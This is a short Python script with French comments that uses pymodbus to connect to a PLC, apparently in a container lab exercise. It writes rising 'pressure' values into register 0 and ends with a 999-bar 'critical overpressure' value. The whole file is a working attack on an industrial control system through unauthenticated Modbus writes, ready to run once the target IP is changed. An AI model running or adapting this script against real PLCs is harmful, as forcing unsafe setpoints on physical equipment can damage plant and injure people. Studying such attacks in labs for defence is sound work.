from pymodbus.client import ModbusTcpClient
import time
import sys

# --- CONFIGURATION ---
# REMPLACEZ CECI PAR LA VRAIE IP TROUVÉE (ex: 172.18.0.2)
PLC_IP = "172.18.0.2" 
PLC_PORT = 502
UNIT_ID = 1  # Essayez 1. Si erreur, essayez 0 ou 255.

client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

print(f"[+] Tentative de connexion à {PLC_IP}...")

if client.connect():
    print("[+] Connexion établie. Début de la séquence.")
    
    # 1. Montée progressive
    for i in range(0, 101, 10): # 0 à 100 inclus
        print(f" -> Injection valeur : {i} Bars")
        
        # Pymodbus v3 utilise 'slave', v2 utilise 'unit'.
        # L'argument ici écrit dans le registre 0.
        try:
            # Essai avec la syntaxe moderne
            rr = client.write_register(0, i, slave=UNIT_ID)
        except TypeError:
            # Fallback pour ancienne version de pymodbus
            rr = client.write_register(0, i, unit=UNIT_ID)
            
        if rr.isError():
            print(f"ERREUR D'ÉCRITURE : {rr}")
            break
        
        time.sleep(0.5) # Pause réduite pour l'exercice

    # 2. Valeur critique finale
    print("[!] SURPRESSION CRITIQUE : 999 Bars")
    try:
        client.write_register(0, 999, slave=UNIT_ID)
    except TypeError:
        client.write_register(0, 999, unit=UNIT_ID)

    client.close()
    print("[+] Fin du script. Vérifiez le système avec check_system.py")

else:
    print("[-] Échec de connexion. Vérifiez l'IP et que le conteneur/PLC est lancé.")